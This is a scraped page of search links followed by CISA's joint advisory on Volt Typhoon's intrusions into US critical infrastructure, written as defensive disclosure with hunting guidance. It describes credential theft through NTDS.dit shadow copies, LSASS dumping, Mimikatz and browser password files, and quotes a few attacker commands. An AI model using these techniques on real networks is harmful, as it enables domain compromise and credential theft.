› en › insights › salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended](https://www.ashurstperkinscoie.com/en/insights/salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended-mitigations/)
- [Salt Typhoon Cyberattacks: Updated Threat Assessment and ...](https://www.ashurstperkinscoie.com/en/insights/salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended-mitigations/)
- [cached](https://web.archive.org/web/https://www.ashurstperkinscoie.com/en/insights/salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended-mitigations/)
- [https://globalcyberalliance.org
› new-report-salt-typhoon-across-the-internet](https://globalcyberalliance.org/new-report-salt-typhoon-across-the-internet/)
- [New Report: Salt Typhoon Across the Internet - GCA](https://globalcyberalliance.org/new-report-salt-typhoon-across-the-internet/)
- [cached](https://web.archive.org/web/https://globalcyberalliance.org/new-report-salt-typhoon-across-the-internet/)
- [https://www.congress.gov
› crs_external_products › IF › PDF › IF12798 › IF12798.15.pdf](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PDF Salt Typhoon Hacks of Telecommunications Companies and Federal Response ...](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [cached](https://web.archive.org/web/https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [https://eclypsium.com
› blog › cisa-fbi-salt-typhoon-guidance](https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/)
- [New Salt Typhoon Defense Guidance from FBI and CISA - Eclypsium](https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/)
- [cached](https://web.archive.org/web/https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/)
- [https://www.bsi.bund.de
› SharedDocs › Downloads › EN › BSI › Cyber-Security › CSA_Salt-Typhoon.html](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.html)
- [Joint Cybersecurity advisory (CSA) about SALT TYPHOON](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.html)
- [cached](https://web.archive.org/web/https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.html)
- [https://failsearx.culturanerd.it/search#](https://failsearx.culturanerd.it/search#)
- [SearXNG](https://failsearx.culturanerd.it/info/en/about)
- [Source code](https://github.com/searxng/searxng)
- [Issue tracker](https://github.com/searxng/searxng/issues)
- [Engine stats](https://failsearx.culturanerd.it/stats)
- [Public instances](https://searx.space/)



- [https://www.ic3.gov › CSA › 2025 › 250827.pdf  ](https://www.ic3.gov/CSA/2025/250827.pdf)



- [PDF Countering Chinese State-Sponsored Actors Compromise of Networks ...](https://www.ic3.gov/CSA/2025/250827.pdf)



- [cached](https://web.archive.org/web/https://www.ic3.gov/CSA/2025/250827.pdf)



- [https://www.congress.gov › crs_external_products › IF › PDF › IF12798 › IF12798.15.pdf  ](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)



- [PDF Salt Typhoon Hacks of Telecommunications Companies and Federal Response ...](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)



- [cached](https://web.archive.org/web/https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)



### PRC State-Sponsored Actors Compromise and Maintain Persistent ... - CISA


An official website of the United States government

Here’s how you know

Search

PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure
SHARE:
Opens in a new window
Opens in a new window
Opens in a new window
CYBERSECURITY ADVISORY
PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure
Release DateFebruary 07, 2024
Alert CodeAA24-038A
RELATED TOPICS: NATION-STATE THREATS , CRITICAL INFRASTRUCTURE SECURITY AND RESILIENCE , CYBER THREATS AND RESPONSE
ACTIONS TO TAKE TODAY TO MITIGATE VOLT TYPHOON ACTIVITY:

Apply patches for internet-facing systems. Prioritize patching critical vulnerabilities in appliances known to be frequently exploited by Volt Typhoon.

Implement phishing-resistant MFA.

Ensure logging is turned on for application, access, and security logs and store logs in a central system.

Plan “end of life” for technology beyond manufacturer’s supported lifecycle.

SUMMARY

The Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), and Federal Bureau of Investigation (FBI) assess that People’s Republic of China (PRC) state-sponsored cyber actors are seeking to pre-position themselves on IT networks for disruptive or destructive cyberattacks against U.S. critical infrastructure in the event of a major crisis or conflict with the United States.

CISA, NSA, FBI and the following partners are releasing this advisory to warn critical infrastructure organizations about this assessment, which is based on observations from the U.S. authoring agencies’ incident response activities at critical infrastructure organizations compromised by the PRC state-sponsored cyber group known as Volt Typhoon (also known as Vanguard Panda, BRONZE SILHOUETTE, Dev-0391, UNC3236, Voltzite, and Insidious Taurus):

U.S. Department of Energy (DOE)
U.S. Environmental Protection Agency (EPA)
U.S. Transportation Security Administration (TSA)
Australian Signals Directorate’s (ASD’s) Australian Cyber Security Centre (ACSC)
Canadian Centre for Cyber Security (CCCS), a part of the Communications Security Establishment (CSE)
United Kingdom National Cyber Security Centre (NCSC-UK)
New Zealand National Cyber Security Centre (NCSC-NZ)

The U.S. authoring agencies have confirmed that Volt Typhoon has compromised the IT environments of multiple critical infrastructure organizations—primarily in Communications, Energy, Transportation Systems, and Water and Wastewater Systems Sectors—in the continental and non-continental United States and its territories, including Guam. Volt Typhoon’s choice of targets and pattern of behavior is not consistent with traditional cyber espionage or intelligence gathering operations, and the U.S. authoring agencies assess with high confidence that Volt Typhoon actors are pre-positioning themselves on IT networks to enable lateral movement to OT assets to disrupt functions. The U.S. authoring agencies are concerned about the potential for these actors to use their network access for disruptive effects in the event of potential geopolitical tensions and/or military conflicts. CCCS assesses that the direct threat to Canada’s critical infrastructure from PRC state-sponsored actors is likely lower than that to U.S. infrastructure, but should U.S. infrastructure be disrupted, Canada would likely be affected as well, due to cross-border integration. ASD’s ACSC and NCSC-NZ assess Australian and New Zealand critical infrastructure, respectively, could be vulnerable to similar activity from PRC state-sponsored actors.

As the authoring agencies have previously highlighted, the use of living off the land (LOTL) techniques is a hallmark of Volt Typhoon actors’ malicious cyber activity when targeting critical infrastructure. The group also relies on valid accounts and leverage strong operational security, which combined, allows for long-term undiscovered persistence. In fact, the U.S. authoring agencies have recently observed indications of Volt Typhoon actors maintaining access and footholds within some victim IT environments for at least five years. Volt Typhoon actors conduct extensive pre-exploitation reconnaissance to learn about the target organization and its environment; tailor their tactics, techniques, and procedures (TTPs) to the victim’s environment; and dedicate ongoing resources to maintaining persistence and understanding the target environment over time, even after initial compromise.

The authoring agencies urge critical infrastructure organizations to apply the mitigations in this advisory and to hunt for similar malicious activity using the guidance herein provided, along with the recommendations found in joint guide Identifying and Mitigating Living Off the Land Techniques. These mitigations are primarily intended for IT and OT administrators in critical infrastructure organizations. Following the mitigations for prevention of or in response to an incident will help disrupt Volt Typhoon’s accesses and reduce the threat to critical infrastructure entities.

If activity is identified, the authoring agencies strongly recommend that critical infrastructure organizations apply the incident response recommendations in this advisory and report the incident to the relevant agency (see Contact Information section).

For additional information, see joint advisory People’s Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection and U.S. Department of Justice (DOJ) press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure. For more information on PRC state-sponsored malicious cyber activity, see CISA’s China Cyber Threat Overview and Advisories webpage.

Download the PDF version of this report:

AA24-038A PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure
(PDF, 1.56 MB )
AA24-038A PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure - Spanish Translation
(PDF, 1.50 MB )

Read the accompanying Malware Analysis Report: MAR-10448362-1.v1 Volt Typhoon.

For a downloadable copy of indicators of compromise (IOCs), see:

MAR-10448362.c1.v2.CLEAR_stix2.json
(JSON, 51.99 KB )
TECHNICAL DETAILS

Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See Appendix C: MITRE ATT&CK Tactics and Techniques section for tables of the Volt Typhoon cyber threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.

Overview of Activity

In May 2023, the authoring agencies—working with industry partners—disclosed information about activity attributed to Volt Typhoon (see joint advisory People’s Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection). Since then, CISA, NSA, and FBI have determined that this activity is part of a broader campaign in which Volt Typhoon actors have successfully infiltrated the networks of critical infrastructure organizations in the continental and non-continental United States and its territories, including Guam.

The U.S. authoring agencies have primarily observed compromises linked to Volt Typhoon in Communications, Energy, Transportation Systems, and Water and Wastewater Systems sector organizations’ IT networks. Some victims are smaller organizations with limited cybersecurity capabilities that provide critical services to larger organizations or key geographic locations.

Volt Typhoon actors tailor their TTPs to the victim environment; however, the U.S. authoring agencies have observed the actors typically following the same pattern of behavior across identified intrusions. Their choice of targets and pattern of behavior is not consistent with traditional cyber espionage or intelligence gathering operations, and the U.S. authoring agencies assess with high confidence that Volt Typhoon actors are pre-positioning themselves on IT networks to enable the disruption of OT functions across multiple critical infrastructure sectors (see Figure 1).

Volt Typhoon conducts extensive pre-compromise reconnaissance to learn about the target organization’s network architecture and operational protocols. This reconnaissance includes identifying network topologies, security measures, typical user behaviors, and key network and IT staff. The intelligence gathered by Volt Typhoon actors is likely leveraged to enhance their operational security. For example, in some instances, Volt Typhoon actors may have abstained from using compromised credentials outside of normal working hours to avoid triggering security alerts on abnormal account activities.
Volt Typhoon typically gains initial access to the IT network by exploiting known or zero-day vulnerabilities in public-facing network appliances (e.g., routers, virtual private networks [VPNs], and firewalls) and then connects to the victim’s network via VPN for follow-on activities.
Volt Typhoon aims to obtain administrator credentials within the network, often by exploiting privilege escalation vulnerabilities in the operating system or network services. In some cases, Volt Typhoon has obtained credentials insecurely stored on a public-facing network appliance.
Volt Typhoon uses valid administrator credentials to move laterally to the domain controller (DC) and other devices via remote access services such as Remote Desktop Protocol (RDP).
Volt Typhoon conducts discovery in the victim’s network, leveraging LOTL binaries for stealth. A key tactic includes using PowerShell to perform targeted queries on Windows event logs, focusing on specific users and periods. These queries facilitate the discreet extraction of security event logs into .dat files, allowing Volt Typhoon actors to gather critical information while minimizing detection. This strategy, blending in-depth pre-compromise reconnaissance with meticulous post-exploitation intelligence collection, underscores their sophisticated and strategic approach to cyber operations.
Volt Typhoon achieves full domain compromise by extracting the Active Directory database (NTDS.dit) from the DC. Volt Typhoon frequently employs the Volume Shadow Copy Service (VSS) using command-line utilities such as vssadmin to access NTDS.dit. The NTDS.dit file is a centralized repository that contains critical Active Directory data, including user accounts, passwords (in hashed form), and other sensitive data, which can be leveraged for further exploitation. This method entails the creation of a shadow copy—a point-in-time snapshot—of the volume hosting the NTDS.dit file. By leveraging this snapshot, Volt Typhoon actors effectively bypass the file locking mechanisms inherent in a live Windows environment, which typically prevent direct access to the NTDS.dit file while the domain controller is operational.
Volt Typhoon likely uses offline password cracking techniques to decipher these hashes. This process involves extracting the hashes from the NTDS.dit file and then applying various password cracking methods, such as brute force attacks, dictionary attacks, or more sophisticated techniques like rainbow tables to uncover the plaintext passwords. The successful decryption of these passwords allows Volt Typhoon actors to obtain elevated access and further infiltrate and manipulate the network.
Volt Typhoon uses elevated credentials for strategic network infiltration and additional discovery, often focusing on gaining capabilities to access OT assets. Volt Typhoon actors have been observed testing access to domain-joint OT assets using default OT vendor credentials, and in certain instances, they have possessed the capability to access OT systems whose credentials were compromised via NTDS.dit theft. This access enables potential disruptions, such as manipulating heating, ventilation, and air conditioning (HVAC) systems in server rooms or disrupting critical energy and water controls, leading to significant infrastructure failures (in some cases, Volt Typhoon actors had the capability to access camera surveillance systems at critical infrastructure facilities). In one confirmed compromise, Volt Typhoon actors moved laterally to a control system and were positioned to move to a second control system.
Figure 1: Typical Volt Typhoon Activity

After successfully gaining access to legitimate accounts, Volt Typhoon actors exhibit minimal activity within the compromised environment (except discovery as noted above), suggesting their objective is to maintain persistence rather than immediate exploitation. This assessment is supported by observed patterns where Volt Typhoon methodically re-targets the same organizations over extended periods, often spanning several years, to continuously validate and potentially enhance their unauthorized accesses. Evidence of their meticulous approach is seen in instances where they repeatedly exfiltrate domain credentials, ensuring access to current and valid accounts. For example, in one compromise, Volt Typhoon likely extracted NTDS.dit from three domain controllers in a four-year period. In another compromise, Volt Typhoon actors extracted NTDS.dit two times from a victim in a nine-month period.

Industry reporting—identifying that Volt Typhoon actors are silent on the network following credential dumping and perform discovery to learn about the environment, but do not exfiltrate data—is consistent with the U.S. authoring agencies’ observations. This indicates their aim is to achieve and maintain persistence on the network. In one confirmed compromise, an industry partner observed Volt Typhoon actors dumping credentials at regular intervals.

In addition to leveraging stolen account credentials, the actors use LOTL techniques and avoid leaving malware artifacts on systems that would cause alerts. Their strong focus on stealth and operational security allows them to maintain long-term, undiscovered persistence. Further, Volt Typhoon’s operational security is enhanced by targeted log deletion to conceal their actions within the compromised environment.

See the below sections for Volt Typhoon TTPs observed by the U.S. authoring agencies from multiple confirmed Volt Typhoon compromises.

Observed TTPs
Reconnaissance

Volt Typhoon actors conduct extensive pre-compromise reconnaissance [TA0043] to learn about the target organization [T1591], its network [T1590], and its staff [T1589]. This includes web searches [T1593]—including victim-owned sites [T1594]—for victim host [T1592], identity, and network information, especially for information on key network and IT administrators. According to industry reporting, Volt Typhoon actors use FOFA[1], Shodan, and Censys for querying or searching for exposed infrastructure. In some instances, the U.S. authoring agencies have observed Volt Typhoon actors targeting the personal emails of key network and IT staff [T1589.002] post compromise.

Resource Development

Historically, Volt Typhoon actors use multi-hop proxies for command and control (C2) infrastructure [T1090.003]. The proxy is typically composed of virtual private servers (VPSs) [T1583.003] or small office/home office (SOHO) routers. Recently, Volt Typhoon actors used Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support their operations [T1584.005]. (See DOJ press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure for more information).

Initial Access

To obtain initial access [TA0001], Volt Typhoon actors commonly exploit vulnerabilities in networking appliances such as those from Fortinet, Ivanti Connect Secure (formerly Pulse Secure), NETGEAR, Citrix, and Cisco [T1190]. They often use publicly available exploit code for known vulnerabilities [T1588.005] but are also adept at discovering and exploiting zero-day vulnerabilities [T1587.004].

In one confirmed compromise, Volt Typhoon actors likely obtained initial access by exploiting CVE-2022-42475 in a network perimeter FortiGate 300D firewall that was not patched. There is evidence of a buffer overflow attack identified within the Secure Sockets Layer (SSL)-VPN crash logs.

Once initial access is achieved, Volt Typhoon actors typically shift to establishing persistent access [TA0003]. They often use VPN sessions to securely connect to victim environments [T1133], enabling discreet follow-on intrusion activities. This tactic not only provides a stable foothold in the network but also allows them to blend in with regular traffic, significantly reducing their chances of detection.

Execution

Volt Typhoon actors rarely use malware for post-compromise execution. Instead, once Volt Typhoon actors gain access to target environments, they use hands-on-keyboard activity via the command-line [T1059] and other native tools and processes on systems [T1218] (often referred to as “LOLBins”), known as LOTL, to maintain and expand access to the victim networks. According to industry reporting, some “commands appear to be exploratory or experimental, as the operators [i.e., malicious actors] adjust and repeat them multiple times.”[2]

For more details on LOTL activity, see the Credential Access and Discovery sections and Appendix A: Volt Typhoon LOTL Activity.

Similar to LOTL, Volt Typhoon actors also use legitimate but outdated versions of network admin tools. For example, in one confirmed compromise, actors downloaded [T1105] an outdated version of comsvcs.dll on the DC in a non-standard folder. comsvcs.dll is a legitimate Microsoft Dynamic Link Library (DLL) file normally found in the System32 folder. The actors used this DLL with MiniDump and the process ID of the Local Security Authority Subsystem Service (LSASS) to dump the LSASS process memory [T1003.001] and obtain credentials (LSASS process memory space contains hashes for the current user’s operating system (OS) credentials).

The actors also use legitimate non-native network admin and forensic tools. For example, Volt Typhoon actors have been observed using Magnet RAM Capture (MRC) version 1.20 on domain controllers. MRC is a free imaging tool that captures the physical memory of a computer, and Volt Typhoon actors likely used it to analyze in-memory data for sensitive information (such as credentials) and in-transit data not typically accessible on disk. Volt Typhoon actors have also been observed implanting Fast Reverse Proxy (FRP) for command and control.[3] (See the Command and Control section).

Persistence

Volt Typhoon primarily relies on valid credentials for persistence [T1078].

Defense Evasion

Volt Typhoon has strong operational security. Their actors primarily use LOTL for defense evasion [TA0005], which allows them to camouflage their malicious activity with typical system and network behavior, potentially circumventing simplistic endpoint security capabilities. For more information, see joint guide Identifying and Mitigating Living off the Land Techniques.

Volt Typhoon actors also obfuscate their malware. In one confirmed compromise, Volt Typhoon obfuscated FRP client files (BrightmetricAgent.exe and SMSvcService.exe) and the command-line port scanning utility ScanLine by packing the files with Ultimate Packer for Executables (UPX) [T1027.002]. FRP client applications support encryption, compression, and easy token authentication and work across multiple protocols—including transmission control protocol (TCP), user datagram protocol (UDP), hypertext transfer protocol (HTTP), and hypertext transfer protocol secure (HTTPS). The FRP client applications use the Kuai connection protocol (KCP) for error-checked and anonymous data stream delivery over UDP, with packet-level encryption support. See Appendix C and CISA Malware Analysis Report (MAR)-10448362-1.v1 for more information.

In addition to LOTL and obfuscation techniques, Volt Typhoon actors have been observed selectively clearing Windows Event Logs [T1070.001], system logs, and other technical artifacts to remove evidence [T1070.009] of their intrusion activity and masquerading file names [T1036.005].

Credential Access

Volt Typhoon actors first obtain credentials from public-facing appliances after gaining initial access by exploiting privilege escalation vulnerabilities [T1068] in the operating system or network services. In some cases, they have obtained credentials insecurely stored on the appliance [T1552]. In one instance, where Volt Typhoon likely exploited CVE-2022-42475 in an unpatched Fortinet device, Volt Typhoon actors compromised a domain admin account stored inappropriately on the device.

Volt Typhoon also consistently obtains valid credentials by extracting the Active Directory database file (NTDS.dit)—in some cases multiple times from the same victim over long periods [T1003.003]. NTDS.dit contains usernames, hashed passwords, and group memberships for all domain accounts, essentially allowing for full domain compromise if the hashes can be cracked offline.

To obtain NTDS.dit, the U.S. authoring agencies have observed Volt Typhoon:

Move laterally [TA0008] to the domain controller via an interactive RDP session using a compromised account with domain administrator privileges [T1021.001];
Execute the Windows-native vssadmin [T1006] command to create a volume shadow copy;
Use Windows Management Instrumentation Console (WMIC) commands [T1047] to execute ntdsutil (a LOTL utility) to copy NTDS.dit and SYSTEM registry hive from the volume shadow copy; and
Exfiltrate [TA0010] NTDS.dit and SYSTEM registry hive to crack passwords offline) [T1110.002]. (For more details, including specific commands used, see Appendix A: Volt Typhoon LOTL Activity.)
Note: A volume shadow copy contains a copy of all the files and folders that exist on the specified volume. Each volume shadow copy created on a DC includes its NTDS.dit and the SYSTEM registry hive, which provides keys to decrypt the NTDS.dit file.

Volt Typhoon actors have also been observed interacting with a PuTTY application by enumerating existing stored sessions [T1012]. Given this interaction and the exposure of cleartext-stored proxy passwords used in remote administration, Volt Typhoon actors potentially had access to PuTTY profiles that allow access to critical systems (see the Lateral Movement section).

According to industry reporting, Volt Typhoon actors attempted to dump credentials through LSASS (see Appendix B for commands used).[2]

The U.S. authoring agencies have observed Volt Typhoon actors leveraging Mimikatz to harvest credentials, and industry partners have observed Volt Typhoon leveraging Impacket.[2]

Mimikatz is a credential dumping tool and Volt Typhoon actors use it to obtain credentials. In one confirmed compromise, the Volt Typhoon used RDP to connect to a server and run Mimikatz after leveraging a compromised administrator account to deploy it.
Impacket is an open source Python toolkit for programmatically constructing and manipulating network protocols. It contains tools for Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks—as well as remote service execution.
Discovery

Volt Typhoon actors have been observed using commercial tools, LOTL utilities, and appliances already present on the system for system information [T1082], network service [T1046], group [T1069] and user [T1033] discovery.

Volt Typhoon uses at least the following LOTL tools and commands for system information, network service, group, and user discovery techniques:

Some observed specific examples of discovery include:

Capturing successful logon events [T1654].
Specifically, in one incident, analysis of the PowerShell console history of a domain controller indicated that security event logs were directed to a file named user.dat, as evidenced by the executed command Get-EventLog security -instanceid 4624 -after [year-month-date] | fl * | Out-File 'C:\users\public\documents\user.dat'. This indicates the group's specific interest in capturing successful logon events (event ID 4624) to analyze user authentication patterns within the network. Additionally, file system analysis, specifically of the Master File Table (MFT), uncovered evidence of a separate file, systeminfo.dat, which was created in C:\Users\Public\Documents but subsequently deleted [T1070.004]. The presence of these activities suggests a methodical approach by Volt Typhoon actors in collecting and then possibly removing traces of sensitive log information from the compromised system.
Executing tasklist /v to gather a detailed process listing [T1057], followed by executing taskkill /f /im rdpservice.exe (the function of this executable is not known).
Executing net user and quser for user account information [T1087.001].
Creating and accessing a file named rult3uil.log on a domain controller in C:\Windows\System32\. The rult3uil.log file contained user activities on a compromised system, showcasing a combination of window title information [T1010] and focus shifts, keypresses, and command executions across Google Chrome and Windows PowerShell, with corresponding timestamps.
Employing ping with various IP addresses to check network connectivity [T1016.001] and net start to list running services [T1007].

See Appendix A for additional LOTL examples.

In one confirmed compromise, Volt Typhoon actors attempted to use Advanced IP Scanner, which was on the network for admin use, to scan the network.

Volt Typhoon actors have been observed strategically targeting network administrator web browser data—focusing on both browsing history and stored credentials [T1555.003]—to facilitate targeting of personal email addresses (see the Reconnaissance section) for further discovery and possible network modifications that may impact the threat actor’s persistence within victim networks.

In one confirmed compromise:

Volt Typhoon actors obtained the history file from the User Data directory of a network administrator user’s Chrome browser. To obtain the history file, Volt Typhoon actors first executed an RDP session to the user’s workstation where they initially attempted, and failed, to obtain the C$ File Name: users\{redacted}\appdata\local\Google\Chrome\UserData\default\History file, as evidenced by the accompanying 1016 (reopen failed) SMB error listed in the application event log. The threat actors then disconnected the RDP session to the workstation and accessed the file C:\Users\{redacted}\Downloads\History.zip. This file presumably contained data from the User Data directory of the user’s Chrome browser, which the actors likely saved in the Downloads directory for exfiltration [T1074]. Shortly after accessing the history.zip file, the actors terminated RDP sessions.
About four months later, Volt Typhoon actors accessed the same user’s Chrome data C$ File Name: Users\{redacted}\AppData\Local\Google\Chrome\User Data\Local State and $ File Name: Users\{redacted}\AppData\Local\Google\Chrome\User Data\Default\Login Data via SMB. The Local State file contains the Advanced Encryption Standard (AES) encryption key [T1552.004] used to encrypt the passwords stored in the Chrome browser, which would enable the actors to obtain plaintext passwords stored in the Login Data file in the Chrome browser.

In another confirmed compromise, Volt Typhoon actors accessed directories containing Chrome and Edge user data on multiple systems. Directory interaction was observed over the network to paths such as C:\Users\{redacted}\AppData\Local\Google\Chrome\User Data\ and C:\Users\{redacted}\AppData\Local\Microsoft\Edge\User Data\. They also enumerated several directories, including directories containing vulnerability testing and cyber related content and facilities data, such as construction drawings [T1083].

Lateral Movement

For lateral movement, Volt Typhoon actors have been observed predominantly employing RDP with compromised valid administrator credentials. Note: With a full on-premises Microsoft Active Directory identity compromise (see the Credential Access section), the group may be capable of using other methods such as Pass the Hash or Pass the Ticket for lateral movement [T1550].

In one confirmed compromise of a Water and Wastewater Systems Sector entity, after obtaining initial access, Volt Typhoon actors connected to the network via a VPN with administrator credentials they obtained and opened an RDP session with the same credentials to move laterally. Over a nine-month period, they moved laterally to a file server, a domain controller, an Oracle Management Server (OMS), and a VMware vCenter server. The actors obtained domain credentials from the domain controller and performed discovery, collection, and exfiltration on the file server (see the Discovery and Collection and Exfiltration sections).

Volt Typhoon’s movement to the vCenter server was likely strategic for pre-positioning to OT assets. The vCenter server was adjacent to OT assets, and Volt Typhoon actors were observed interacting with the PuTTY application on the server by enumerating existing stored sessions. With this information, Volt Typhoon potentially had access to a range of critical PuTTY profiles, including those for water treatment plants, water wells, an electrical substation, OT systems, and network security devices. This would enable them to access these critical systems [T1563]. See Figure 2.

Figure 2: Volt Typhoon Lateral Movement Path File Server, DC, and OT-Adjacent Assets

Additionally, Volt Typhoon actors have been observed using PSExec to execute remote processes, including the automated acceptance of the end-user license agreement (EULA) through an administrative account, signified by the accepteula command flag.

Volt Typhoon actors may have attempted to move laterally to a cloud environment in one victim’s network but direct attribution to the Volt Typhoon group was inconclusive. During the period of the their known network presence, there were anomalous login attempts to an Azure tenant [T1021.007] potentially using credentials [T1078.004] previously compromised from theft of NTDS.dit. These attempts, coupled with misconfigured virtual machines with open RDP ports, suggested a potential for cloud-based lateral movement. However, subsequent investigations, including password changes and multifactor authentication (MFA) implementations, revealed authentication failures from non-associated IP addresses, with no definitive link to Volt Typhoon.

Collection and Exfiltration

The U.S. authoring agencies assess Volt Typhoon primarily collects information that would facilitate follow-on actions with physical impacts. For example, in one confirmed compromise, they collected [TA0009] sensitive information obtained from a file server in multiple zipped files [T1560] and likely exfiltrated [TA0010] the files via Server Message Block (SMB) [T1048] (see Figure 3). Collected information included diagrams and documentation related to OT equipment, including supervisory control and data acquisition (SCADA) systems, relays, and switchgear. This data is crucial for understanding and potentially impacting critical infrastructure systems, indicating a focus on gathering intelligence that could be leveraged in actions targeting physical assets and systems.

Figure 3: Volt Typhoon Attack Path for Exfiltration of Data from File Server

In another compromise, Volt Typhoon actors leveraged WMIC to create and use temporary directories (C:\Users\Public\pro, C:\Windows\Temp\tmp, C:\Windows\Temp\tmp\Active Directory and C:\Windows\Temp\tmp\registry) to stage the extracted ntds.dit and SYSTEM registry hives from ntdsutil execution volume shadow copies (see the Credential Access section) obtained from two DCs. They then compressed and archived the extracted ntds.dit and accompanying registry files by executing ronf.exe, which was likely a renamed version of the archive utility rar.exe) [T1560.001].

Command and Control

Volt Typhoon actors have been observed leveraging compromised SOHO routers and virtual private servers (VPS) to proxy C2 traffic. For more information, see DOJ press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure).

They have also been observed setting up FRP clients [T1090] on a victim’s corporate infrastructure to establish covert communications channels [T1573] for command and control. In one instance, Volt Typhoon actors implanted the FRP client with filename SMSvcService.exe on a Shortel Enterprise Contact Center (ECC) server and a second FRP client with filename Brightmetricagent.exe on another server. These clients, when executed via PowerShell [T1059.001], open reverse proxies between the compromised system and Volt Typhoon C2 servers. Brightmetricagent.exe has additional capabilities. The FRP client can locate servers behind a network firewall or obscured through Network Address Translation (NAT) [T1016]. It also contains multiplexer libraries that can bi-directionally stream data over NAT networks and contains a command-line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), and Z Shell (zsh) [T1059.004]. See Appendix C and MAR-10448362-1.v1 for more information.

In the same compromise, Volt Typhoon actors exploited a Paessler Router Traffic Grapher (PRTG) server as an intermediary for their FRP operations. To facilitate this, they used the netsh command, a legitimate Windows command, to create a PortProxy registry modification [T1112] on the PRTG server [T1090.001]. This key alteration redirected specific port traffic to Volt Typhoon’s proxy infrastructure, effectively converting the PRTG’s server into a proxy for their C2 traffic [T1584.004] (see Appendix B for details).

DETECTION/HUNT RECOMMENDATIONS
Apply Living off the Land Detection Best Practices

Apply the prioritized detection and hardening best practice recommendations provided in joint guide Identifying and Mitigating Living off the Land Techniques. Many organizations lack security and network management best practices (such as established baselines) that support detection of malicious LOTL activity—this makes it difficult for network defenders to discern legitimate behavior from malicious behavior and conduct behavior analytics, anomaly detection, and proactive hunting. Conventional IOCs associated with the malicious activity are generally lacking, complicating network defenders’ efforts to identify, track, and categorize this sort of malicious behavior. This advisory provides guidance for a multifaceted cybersecurity strategy that enables behavior analytics, anomaly detection, and proactive hunting, which are part of a comprehensive approach to mitigating cyber threats that employ LOTL techniques.

Review Application, Security, and System Event Logs

Routinely review application, security, and system event logs, focusing on Windows Extensible Storage Engine Technology (ESENT) Application Logs. Due to Volt Typhoon’s ability for long-term undetected persistence, network defenders should assume significant dwell time and review specific application event log IDs, which remain on endpoints for longer periods compared to security event logs and other ephemeral artifacts. Focus on Windows ESENT logs because certain ESENT Application Log event IDs (216, 325, 326, and 327) may indicate actors copying NTDS.dit.

See Table 1 for examples of ESENT and other key log indicators that should be investigated. Please note that incidents may not always have exact matches listed in the Event Detail column due to variations in event logging and TTPs.

Table 1: Key Log Indicators for Detecting Volt Typhoon Activity
Event ID (Log) Event Detail Description
216 (Windows ESENT Application Log) A database location change was detected from 'C:\Windows\NTDS\ntds.dit' to '\\?\GLOBALROOT\Device\{redacted}VolumeShadowCopy1\Windows\NTDS\ntds.dit' A change in the NTDS.dit database location is detected. This could suggest an initial step in NTDS credential dumping where the database is being prepared for extraction.
325 (Windows ESENT Application Log) The database engine created a new database (2, C:\Windows\Temp\tmp\Active Directory\ntds.dit). Indicates creation of a new NTDS.dit file in a non-standard directory. Often a sign of data staging for exfiltration. Monitor for unusual database operations in temp directories.
637 (Windows ESENT Application Log) C:\Windows\Temp\tmp\Active Directory\ntds.jfm-++- (0) New flush map file “C:\Windows\Temp\tmp\Active Directory\ntds.jfm” will be created to enable persisted lost flush detection. A new flush map file is being created for NTDS.dit. This may suggest ongoing operations related to NTDS credential dumping, potentially capturing uncommitted changes to the NTDS.dit file.
326 (Windows ESENT Application Log)

NTDS-++-12460,D,100-++--++-1-++-

C:\$SNAP_{redacted}_VOLUMEC$\Windows\NTDS\ntds.dit-++-0-++- [1] The database engine attached a database. Began mounting of C:\Windows\NTDS\ntds.dit file created from volume shadow copy process

Represents the mounting of an NTDS.dit file from a volume shadow copy. This is a critical step in NTDS credential dumping, indicating active manipulation of a domain controller’s data.
327 (Windows ESENT Application Log) C:\Windows\Temp\tmp\Active Directory\ntds.dit-++-1-++- [1] The database engine detached a database (2, C:\Windows\Temp\tmp\Active Directory\ntds.dit). Completion of mounting of ntds.dit file to C:\Windows\Temp\tmp\Active Director The detachment of a database, particularly in a temp directory, could indicate the completion of a credential dumping process, potentially as part of exfiltration preparations.
21 (Windows Terminal Services Local Session Manager Operational Log) Remote Desktop Services: Session logon succeeded: User: {redacted}\{redacted} Session ID: {redacted} Source Network Address: {redacted} Successful authentication to a Remote Desktop Services session.
